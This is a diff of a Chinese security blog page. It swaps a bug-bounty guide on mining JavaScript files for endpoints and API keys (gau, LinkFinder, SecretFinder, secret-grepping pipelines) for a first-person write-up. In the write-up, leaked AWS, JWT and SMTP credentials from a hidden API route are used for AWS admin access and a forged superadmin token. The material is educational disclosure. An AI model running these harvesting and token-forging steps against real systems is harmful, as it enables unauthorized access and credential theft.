@@ -19,22 +19,22 @@
   <meta name="author" content="cury">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞赏金的JavaScript枚举：像专业人士一样揭露隐藏的端点和秘密！JavaScript 文件绝对是 漏洞赏金猎人的金矿，通常会泄露隐藏的 API 端点、敏感密钥和管理路径。如果您跳过 JS 枚举，那么您将错过高价值目标和巨额赏金！ 💰 1️ 在 Target 🎯 上查找 JavaScript 文件 A 通用方法（使用 CLI 工具）  1234567891011121314# Get a">
+    <meta name="description" content="从404到获取权限：通过api路由获得生产密钥人生教训 #210：仅仅因为某个东西返回 404 并不意味着它已经死了——有时它只是需要正确的耳语……或精心设计的 cURL。🤯 我不知道一个简单的 404 会成为我进入生产库的金票。 🧠 设置：当 Recon 成为现实时在 SaaS 平台上进行一些大规模侦察时，我偶然发现了一个未经身份验证的子域： 1https:&#x2F;&#x2F;api-dev.targetc">
 <meta property="og:type" content="article">
-<meta property="og:title" content="js的发现和利用">
-<meta property="og:url" content="https://cury-w.github.io/2025/06/30/js%E7%9A%84%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:title" content="404如何继续渗透">
+<meta property="og:url" content="https://cury-w.github.io/2025/06/30/404%E5%A6%82%E4%BD%95%E7%BB%A7%E7%BB%AD%E6%B8%97%E9%80%8F/index.html">
 <meta property="og:site_name" content="坤坤后花园">
-<meta property="og:description" content="漏洞赏金的JavaScript枚举：像专业人士一样揭露隐藏的端点和秘密！JavaScript 文件绝对是 漏洞赏金猎人的金矿，通常会泄露隐藏的 API 端点、敏感密钥和管理路径。如果您跳过 JS 枚举，那么您将错过高价值目标和巨额赏金！ 💰 1️ 在 Target 🎯 上查找 JavaScript 文件 A 通用方法（使用 CLI 工具）  1234567891011121314# Get a">
+<meta property="og:description" content="从404到获取权限：通过api路由获得生产密钥人生教训 #210：仅仅因为某个东西返回 404 并不意味着它已经死了——有时它只是需要正确的耳语……或精心设计的 cURL。🤯 我不知道一个简单的 404 会成为我进入生产库的金票。 🧠 设置：当 Recon 成为现实时在 SaaS 平台上进行一些大规模侦察时，我偶然发现了一个未经身份验证的子域： 1https:&#x2F;&#x2F;api-dev.targetc">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-06-30T03:31:55.000Z">
-<meta property="article:modified_time" content="2025-06-30T03:37:44.240Z">
+<meta property="article:published_time" content="2025-06-30T07:05:49.000Z">
+<meta property="article:modified_time" content="2025-06-30T07:12:05.521Z">
 <meta property="article:author" content="cury">
-<meta property="article:tag" content="js">
+<meta property="article:tag" content="404">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>js的发现和利用 - 坤坤后花园</title>
+  <title>404如何继续渗透 - 坤坤后花园</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -317,7 +317,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="js的发现和利用"></span>
+            <span id="subtitle" data-typed-text="404如何继续渗透"></span>
           
         </div>
 
@@ -328,8 +328,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-06-30 11:31" pubdate>
-          2025年6月30日 中午
+        <time datetime="2025-06-30 15:05" pubdate>
+          2025年6月30日 下午
         </time>
       </span>
     
@@ -340,7 +340,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          653 字
+          689 字
         
       </span>
     
@@ -388,92 +388,85 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">js的发现和利用</h1>
+            <h1 id="seo-header">404如何继续渗透</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="漏洞赏金的JavaScript枚举：像专业人士一样揭露隐藏的端点和秘密！"><a href="#漏洞赏金的JavaScript枚举：像专业人士一样揭露隐藏的端点和秘密！" class="headerlink" title="漏洞赏金的JavaScript枚举：像专业人士一样揭露隐藏的端点和秘密！"></a><strong>漏洞赏金的JavaScript枚举：像专业人士一样揭露隐藏的端点和秘密！</strong></h1><p><em>JavaScript 文件绝对是</em> <em>漏洞赏金猎人的</em><strong>金矿</strong>，通常会泄露<strong>隐藏的 API 端点、敏感密钥和管理路径</strong><em>。如果您跳过 JS 枚举，那么您将</em><strong>错过高价值目标和巨额赏金！</strong> <em>💰</em></p>
-<h1 id="1️-在-Target-🎯-上查找-JavaScript-文件"><a href="#1️-在-Target-🎯-上查找-JavaScript-文件" class="headerlink" title="1️ 在 Target 🎯 上查找 JavaScript 文件"></a><em><strong>1️ 在 Target 🎯 上查找 JavaScript 文件</strong></em></h1><blockquote>
-<p><strong>A 通用方法（使用 CLI 工具）</strong></p>
-</blockquote>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs vim"># Get <span class="hljs-keyword">all</span> JavaScript <span class="hljs-keyword">files</span> from <span class="hljs-keyword">a</span> target using gau (GetAllURLs)<br>gau target.<span class="hljs-keyword">com</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;\.js&quot;</span> | tee js_files.txt<br><br># Extract JS <span class="hljs-keyword">file</span> URLs from Wayback Machine<br>waybackurls target.<span class="hljs-keyword">com</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;\.js&quot;</span> | tee js_wayback.txt<br><br># Use katana <span class="hljs-keyword">for</span> fast crawling<br>katana -<span class="hljs-keyword">u</span> https://target.<span class="hljs-keyword">com</span> -jc -<span class="hljs-keyword">silent</span> | tee js_katana.txt<br><br># Combine <span class="hljs-keyword">all</span> JS sources<br><span class="hljs-keyword">echo</span> target.<span class="hljs-keyword">com</span> | subfinder | httpx -<span class="hljs-keyword">silent</span> | gau | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;\.js&quot;</span> | anew all_js.txt<br><br># Extract JS links from robots.txt<br>curl -s https://target.<span class="hljs-keyword">com</span>/robots.txt | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;\.js&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $NF&#125;&#x27;</span> | tee js_robots.txt<br></code></pre></td></tr></table></figure>
+                <h1 id="从404到获取权限：通过api路由获得生产密钥"><a href="#从404到获取权限：通过api路由获得生产密钥" class="headerlink" title="从404到获取权限：通过api路由获得生产密钥"></a>从404到获取权限：通过api路由获得生产密钥</h1><p><strong>人生教训 #210：</strong>仅仅因为某个东西返回 404 并不意味着它已经<em>死了</em>——有时它只是需要正确的耳语……或精心设计的 cURL。🤯</p>
+<p>我不知道一个简单的 404 会成为我进入生产库的金票。</p>
+<h1 id="🧠-设置：当-Recon-成为现实时"><a href="#🧠-设置：当-Recon-成为现实时" class="headerlink" title="🧠 设置：当 Recon 成为现实时"></a>🧠 设置：当 Recon 成为现实时</h1><p>在 SaaS 平台上进行一些大规模侦察时，我偶然发现了一个未经身份验证的子域：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//api-dev.targetcompany.com</span><br></code></pre></td></tr></table></figure>
 
-<p><strong>年度方法 ：</strong></p>
-<ol>
-<li><strong>检查 Page Source</strong> （） → 查找标签。<code>Ctrl + U``&lt;script&gt;</code></li>
-<li><strong>使用“网络”选项卡</strong> （） →检查从外部源加载的 JS 文件 （） （）。<code>F12 → Sources</code></li>
-<li><strong>使用 Burp Suite Spidering</strong> 查找隐藏的 JS 文件。</li>
-</ol>
-<h1 id="2️-从JavaScript中提取端点和API密钥"><a href="#2️-从JavaScript中提取端点和API密钥" class="headerlink" title="2️ 从JavaScript中提取端点和API密钥"></a><em><strong>2️ 从JavaScript中提取端点和API密钥</strong></em></h1><blockquote>
-<p><strong>使用 LinkFinder 提取端点</strong></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> js_files.txt | xargs -I&#123;&#125; python3 ~/tools/LinkFinder/linkfinder.py -i &#123;&#125; -o li | <span class="hljs-built_in">tee</span> endpoints.txt<br></code></pre></td></tr></table></figure>
+<p>看起来很无聊。我用一些通用路径来探测它：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/api/v1/users<br>/api/v1/admin<br>/api/v1/config<br></code></pre></td></tr></table></figure>
 
-<blockquote>
-<p>使用SecretFinder查找API密钥和秘密</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> js_files.txt | xargs -I&#123;&#125; python3 ~/tools/SecretFinder/SecretFinder.py -i &#123;&#125; -o cli | <span class="hljs-built_in">tee</span> secrets.txt<br></code></pre></td></tr></table></figure>
+<p>一切都回到了 404。或者我是这么想的。</p>
+<p>但是我的爬虫脚本标记了一件奇怪的事情：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GET</span> /api/v1/<span class="hljs-type">internal</span>/statusResponse: <span class="hljs-number">404</span> <span class="hljs-keyword">Not</span> <span class="hljs-built_in">Found</span> (but <span class="hljs-keyword">with</span> a <span class="hljs-number">500</span>ms delay)<br></code></pre></td></tr></table></figure>
 
-<blockquote>
-<p>使用 GF （grep 模式） 查找有趣的模式</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> js_files.txt | gf apikeys | <span class="hljs-built_in">tee</span> api_keys.txt<br><span class="hljs-built_in">cat</span> js_files.txt | gf aws-keys | <span class="hljs-built_in">tee</span> aws_keys.txt<br><span class="hljs-built_in">cat</span> js_files.txt | gf json | <span class="hljs-built_in">tee</span> json_leaks.txt<br><span class="hljs-built_in">cat</span> js_files.txt | gf urls | <span class="hljs-built_in">tee</span> urls.txt<br></code></pre></td></tr></table></figure>
+<h1 id="🔍-深入探讨：冰壶幻影"><a href="#🔍-深入探讨：冰壶幻影" class="headerlink" title="🔍 深入探讨：冰壶幻影"></a>🔍 深入探讨：冰壶幻影</h1><p>我手动点击它：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -i https:<span class="hljs-regexp">//</span>api-dev.targetcompany.com<span class="hljs-regexp">/api/</span>v1<span class="hljs-regexp">/internal/</span>status<br></code></pre></td></tr></table></figure>
 
-<h1 id="使用-grep-手动搜索敏感数据"><a href="#使用-grep-手动搜索敏感数据" class="headerlink" title="使用 grep 手动搜索敏感数据"></a>使用 grep 手动搜索敏感数据</h1><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">grep <span class="hljs-punctuation">-</span>E <span class="hljs-punctuation">-</span>o <span class="hljs-string">&quot;(apiKey|authToken|client_secret|accessToken)[\&quot;</span>&#x27;= ]+[^\&quot;&#x27; ]<span class="hljs-punctuation">+</span><span class="hljs-string">&quot; js_files.txt | tee found_keys.txt</span><br></code></pre></td></tr></table></figure>
+<p>仍然是 404。但标头暴露了它：</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">x-powered-by</span>: <span class="hljs-attribute">expressx-env</span>: production<br></code></pre></td></tr></table></figure>
 
-<h1 id="3️-实现最高效率的链式工具"><a href="#3️-实现最高效率的链式工具" class="headerlink" title="3️ 实现最高效率的链式工具"></a><em><strong>3️ 实现最高效率的链式工具</strong></em></h1><blockquote>
-<p>在一个命令中查找JavaScript文件并提取端点</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gau target.com | grep <span class="hljs-string">&quot;\.js&quot;</span> | <span class="hljs-built_in">tee</span> js_files.txt &amp;&amp; <span class="hljs-built_in">cat</span> js_files.txt | xargs -I&#123;&#125; python3 ~/tools/LinkFinder/linkfinder.py -i &#123;&#125; -o cli | <span class="hljs-built_in">tee</span> endpoints.txt<br></code></pre></td></tr></table></figure>
-
-<blockquote>
-<p>同时查找JavaScript文件并提取API密钥</p>
-</blockquote>
-<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">gau target.com | <span class="hljs-type">grep</span> <span class="hljs-string">&quot;\.js&quot;</span> | <span class="hljs-type">anew</span> js_files.txt &amp;&amp; cat js_files.txt | <span class="hljs-type">gf</span> apikeys | <span class="hljs-type">tee</span> api_keys.txt<br></code></pre></td></tr></table></figure>
-
-<blockquote>
-<p>使用多种工具的完整侦察管道</p>
-</blockquote>
-<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">echo target.com | <span class="hljs-type">subfinder</span> | <span class="hljs-type">httpx</span> -silent | <span class="hljs-type">gau</span> | <span class="hljs-type">grep</span> <span class="hljs-string">&quot;\.js&quot;</span> | <span class="hljs-type">anew</span> js_files.txt &amp;&amp; cat js_files.txt | <span class="hljs-type">xargs</span> -I&#123;&#125; python3 ~/tools/LinkFinder/linkfinder.py -i &#123;&#125; -o cli | <span class="hljs-type">tee</span> endpoints.txt &amp;&amp; cat js_files.txt | <span class="hljs-type">gf</span> apikeys | <span class="hljs-type">tee</span> api_keys.txt<br></code></pre></td></tr></table></figure>
-
-<h1 id="4️-利用提取的端点"><a href="#4️-利用提取的端点" class="headerlink" title="4️ 利用提取的端点"></a><em><strong>4️ 利用提取的端点</strong></em></h1><p>提取 API 端点后，测试它们是否存在漏洞：</p>
-<blockquote>
-<p>测试 API 端点以实现开放访问</p>
-</blockquote>
-<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">cat endpoints.txt | httpx -silent -status-<span class="hljs-built_in">code</span> -<span class="hljs-built_in">title</span> -tech-detect<br></code></pre></td></tr></table></figure>
-
-<blockquote>
-<p>API 参数的模糊测试（使用 ffuf）</p>
-</blockquote>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ffuf</span> -u https://target.com/FUZZ -w endpoints.txt -mc <span class="hljs-number">200</span> -fs <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
-
-<blockquote>
-<p>测试 IDOR（不安全的直接对象引用）</p>
-</blockquote>
-<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">cat endpoints.txt | <span class="hljs-type">qsreplace</span> <span class="hljs-string">&quot;1234&quot;</span> | <span class="hljs-type">xargs</span> -I&#123;&#125; curl -X GET -H <span class="hljs-string">&quot;Authorization: Bearer invalidtoken&quot;</span> &#123;&#125;<br></code></pre></td></tr></table></figure>
-
-<blockquote>
-<p>检查开放目录和敏感文件</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> endpoints.txt | ffuf -u https://target.com/FUZZ -w ~/wordlists/directory-list.txt -mc 200<br></code></pre></td></tr></table></figure>
-
-<h1 id="5️-在-VPS-上自动枚举-JavaScript-（24-7-Recon）"><a href="#5️-在-VPS-上自动枚举-JavaScript-（24-7-Recon）" class="headerlink" title="5️ 在 VPS 上自动枚举 JavaScript （24&#x2F;7 Recon）"></a><em><strong>5️ 在 VPS 上自动枚举 JavaScript （24&#x2F;7 Recon）</strong></em></h1><p>在 VPS 上运行 <strong>cron 作业</strong>以持续监控新的 JavaScript 文件并自动提取密钥。</p>
-<blockquote>
-<p>为 JS 枚举设置 cron 作业</p>
-</blockquote>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">echo <span class="hljs-string">&quot;0 * * * * gau target.com | grep &#x27;.js&#x27; | anew js_files.txt &amp;&amp; cat js_files.txt | gf apikeys | tee api_keys.txt&quot;</span> <span class="hljs-string">| crontab -</span><br></code></pre></td></tr></table></figure>
-
-<blockquote>
-<p>接收 API 密钥泄露的 Telegram 通知</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span> <span class="hljs-built_in">cat</span> api_keys.txt | notify -bulk; <span class="hljs-built_in">sleep</span> 3600; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+<p>这不是一个开发服务器。这是<em>从 dev 子域</em>公开 prod 配置。</p>
+<h1 id="🕴️-发现阶段：Fuzz-Till-You-Drop"><a href="#🕴️-发现阶段：Fuzz-Till-You-Drop" class="headerlink" title="🕴️ 发现阶段：Fuzz Till You Drop"></a>🕴️ 发现阶段：Fuzz Till You Drop</h1><p>是时候做手术了。</p>
+<p>我沿着小路跑：<code>ffuf  /api/v1/internal/</code></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ffuf</span> -u https://api-dev.targetcompany.com/api/v1/internal/FUZZ -w wordlist.txt -mc <span class="hljs-number">200</span>,<span class="hljs-number">403</span>,<span class="hljs-number">500</span> -ac<br></code></pre></td></tr></table></figure>
 
 
 
-<blockquote>
-<p>更聪明地破解，而不是更难！</p>
-</blockquote>
+<ul>
+<li><code>/api/v1/internal/env</code></li>
+<li><code>/api/v1/internal/secrets</code></li>
+<li><code>/api/v1/internal/creds</code></li>
+</ul>
+<p>直到我发送了一个请求：<code>/secrets</code></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl https:<span class="hljs-regexp">//</span>api-dev.targetcompany.com<span class="hljs-regexp">/api/</span>v1<span class="hljs-regexp">/internal/</span>secrets<br></code></pre></td></tr></table></figure>
+
+<p>响应：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;  <span class="hljs-string">&quot;aws_key&quot;</span>: <span class="hljs-string">&quot;AKIAIOSFODNN7EXAMPLE&quot;</span>,  <span class="hljs-string">&quot;aws_secret&quot;</span>: <span class="hljs-string">&quot;wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY&quot;</span>,  <span class="hljs-string">&quot;jwt_secret&quot;</span>: <span class="hljs-string">&quot;thisisnotsosecret123&quot;</span>,  <span class="hljs-string">&quot;smtp_user&quot;</span>: <span class="hljs-string">&quot;alerts<span class="hljs-variable">@targetcompany</span>.com&quot;</span>,  <span class="hljs-string">&quot;smtp_pass&quot;</span>: <span class="hljs-string">&quot;SuperSecret123!&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>这是完全的 prod 凭证泄漏 — 来自<em>一个本应删除</em>但在 404 掩码后面保持开放状态的端点。</p>
+<h1 id="🚀-武器化：从-Leak-到-Pwn"><a href="#🚀-武器化：从-Leak-到-Pwn" class="headerlink" title="🚀 武器化：从 Leak 到 Pwn"></a>🚀 武器化：从 Leak 到 Pwn</h1><p>借助 AWS 信誉，我验证了访问权限：</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">aws configure</span><br></code></pre></td></tr></table></figure>
+
+<p>有效。</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">aws iam list-users</span><br></code></pre></td></tr></table></figure>
+
+<p>完全管理员访问权限。我可以：</p>
+<ul>
+<li>列出 S3 存储桶</li>
+<li>旋转 EC2 实例</li>
+<li>查看日志</li>
+<li>从他们的域发送 SMTP 电子邮件</li>
+</ul>
+<p>使用 ，我伪造了管理员令牌：<code>jwt_secret</code></p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">import jwtpayload = &#123;<span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;superadmin&quot;</span>&#125;<span class="hljs-keyword">token</span> = jwt.<span class="hljs-keyword">encode</span>(payload, <span class="hljs-string">&quot;thisisnotsosecret123&quot;</span>, algorithm=<span class="hljs-string">&quot;HS256&quot;</span>)<span class="hljs-keyword">print</span>(<span class="hljs-keyword">token</span>)<br></code></pre></td></tr></table></figure>
+
+<p>用于：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">GET <span class="hljs-symbol">/dashboard</span> HTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span><span class="hljs-params">Authorization:</span> Bearer <span class="hljs-symbol">&lt;forged_token&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>🚫 没有 2FA。无需额外验证。完全访问权限。</p>
+<p>我现在是他们内部门户的管理员。🧹</p>
+<p><a target="_blank" rel="noopener" href="https://vip.bdziyi.com/how-i-turned-a-403-forbidden-into-a-goldmine-738cdf1407aa?source=post_page-----cc8ec9c6d063---------------------------------------">我如何将 403 Forbidden 变成金矿 🚀免费链接🎈infosecwriteups.com</a></p>
+<h1 id="📊-根本原因：幽灵端点"><a href="#📊-根本原因：幽灵端点" class="headerlink" title="📊 根本原因：幽灵端点"></a>📊 根本原因：幽灵端点</h1><p>事实证明，这些路由本应在暂存期间删除，但仅在前端被<em>注释掉</em>。<code>/api/v1/internal/*</code></p>
+<p>当路由逻辑失败但端点本身存在时，后端仍然用误导性的 404 暴露它们。</p>
+<p>开发逻辑：</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">if</span> (!user) <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>; <span class="hljs-comment">// instead of 403</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="🖊️-最终-PoC-摘要："><a href="#🖊️-最终-PoC-摘要：" class="headerlink" title="🖊️ 最终 PoC 摘要："></a>🖊️ 最终 PoC 摘要：</h1><p><strong>目标：</strong> <code>https://api-dev.targetcompany.com/api/v1/internal/secrets</code></p>
+<p><strong>使用的技术：</strong>路由泄露 + 误导性 404 + 未经身份验证的访问 + 凭据泄露</p>
+<ul>
+<li>AWS 完全访问权限</li>
+<li>SMTP 欺骗</li>
+<li>JWT 身份验证绕过</li>
+<li>敏感信息泄露</li>
+</ul>
 
                 
               </div>
@@ -486,7 +479,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/js/" class="print-no-link">#js</a>
+        <a href="/tags/404/" class="print-no-link">#404</a>
       
     </div>
   
@@ -498,8 +491,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>js的发现和利用</div>
-      <div>https://cury-w.github.io/2025/06/30/js的发现和利用/</div>
+      <div>404如何继续渗透</div>
+      <div>https://cury-w.github.io/2025/06/30/404如何继续渗透/</div>
     </div>
     <div class="license-meta">
       
@@ -543,18 +536,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/06/30/404%E5%A6%82%E4%BD%95%E7%BB%A7%E7%BB%AD%E6%B8%97%E9%80%8F/" title="404如何继续渗透">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">404如何继续渗透</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/06/26/centos7-yum%E6%BA%90/" title="centos7-yum源">
-                        <span class="hidden-mobile">centos7-yum源</span>
+                      <a href="/2025/06/30/js%E7%9A%84%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/" title="js的发现和利用">
+                        <span class="hidden-mobile">js的发现和利用</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
